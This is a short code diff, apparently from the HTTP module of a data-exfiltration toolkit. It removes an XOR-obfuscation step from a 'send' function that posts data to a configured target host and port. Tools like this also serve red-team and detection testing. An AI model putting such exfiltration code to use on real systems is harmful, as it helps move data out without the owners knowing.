@@ -38,7 +38,6 @@ class S(BaseHTTPRequestHandler):
 
 
 def send(data):
-    data = app_exfiltrate.xor(data)
     target = "http://{}:{}".format(config['target'], config['port'])
     app_exfiltrate.log_message(
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
